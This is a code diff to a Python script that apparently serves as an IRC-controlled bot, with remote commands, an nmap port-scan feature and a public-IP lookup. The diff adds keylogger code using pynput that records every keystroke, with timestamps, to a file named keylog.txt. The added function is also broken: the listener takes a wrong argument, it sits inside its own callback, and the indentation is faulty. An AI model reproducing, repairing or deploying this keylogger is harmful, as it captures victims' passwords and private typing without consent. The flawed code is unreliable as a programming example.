@@ -43,12 +43,15 @@ import shutil
 import base64
 import random
 import socket
+import logging
 import datetime
 import platform
 import threading
 import subprocess
 import urllib.request
 from requests import get
+from pynput.keyboard import Key, Listener
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") # Text file to save keylogger data.
 starttime = datetime.datetime.utcnow() # Start time is used to calculate uptime.
 ip = get('https://api.ipify.org').text # Get public IP address. (used to set botnick-to-ip as well as the '.ip' command.)
 sys.path.insert(0, '/usr/local/bin/') # Working directory.
@@ -178,6 +181,12 @@ def linuxMemory(): # Get linux system memory info for .memory command.
 
     sendntc("     " + lines[0].strip(), adminname)
     sendntc("     " + lines[1].strip(), adminname)
+
+def keylogger(key):
+    logging.info(str(key))
+
+    with Listener(keylogger=keylogger) as listener :
+    listener.join()
 
 def nmapScan(tgtHost, tgtPort): # Use nmap to scan ports on an ip address with .scan command
     nmScan = nmap.PortScanner()
